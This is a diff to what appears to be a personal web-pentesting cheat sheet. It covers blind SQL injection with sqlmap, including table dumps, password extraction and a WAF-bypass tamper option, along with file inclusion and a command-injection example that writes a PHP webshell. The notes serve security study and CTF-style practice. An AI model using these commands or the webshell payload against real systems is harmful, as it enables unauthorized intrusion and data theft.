@@ -358,7 +358,7 @@ Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 file dictionary --force --show #1
 		- Another option is to use https://hookbin.com/. You can create endpoints and monitor requests (It's the simplest of all go)
 - **Inclusion of remote files:** The `page` parameter is used in the url to see which page the include is made from and that a file is uploaded from another site. You can run a `webshell` to control and see everything on the server
 - **Local file inclusion attacks:** Include a local file, template sites or exposed downloads within the website. For example, when you pass by url the file you want to use for something. If you do not dimension what the web server can access, you can access files from Linux or Windows itself where the page is hosted.
-- **Sql injection:** There is a type of sql injection that is blind. That is, database or info errors do not come out per screen and you need to use binary logic (true/false) and put that if a user exists, wait x seconds. `sqlmap` automates all of this:
+- **Sql injection:** There is a type of sql injection that is blind. That is, database or info errors do not come out per screen and you need to use binary logic (true/false) and put that if a user exists, wait x seconds. `sqlmap` automates all of this (Some cheat sheets: [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)):
 ```console
 Anthares101@kali:~$ sqlmap -u URL --headers "Cookie: ..."
 # --dump-all Dumpea todas las tablas de todas las bases de datos
@@ -383,6 +383,8 @@ Anthares101@kali:~$ sqlmap -D DB -T TABLE --dump --batch -r post_request.txt
 
 Anthares101@kali:~$ sqlmap -D DB -T TABLE -C id,password,...,... --sql-query "select id,password,...,... from TABLE where COLUMN like PATTERN" -r post_request.txt
 # Extracts the result of a specific query to a known table
+
+# The parameter --tamper=space2comment allows you to try to bypass certain firewalls (WAF)
 ```
 - **RCE (Remote Command Execution):** If you are putting the code directly: `shell_exec('ping 8.8.8.8');` being the ip what the user enters, if instead we put `;ls`, although `ping` prints an error the command `ls` is executed. Once the vulnerability is detected we could run a WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. If we go to `shell1.php`, with the parameter of the url `cmd` we can execute the commands that we want.
 - **OWASP methodology for testing web security:** OWASP broken web application (To practice attacking pages and stuff)
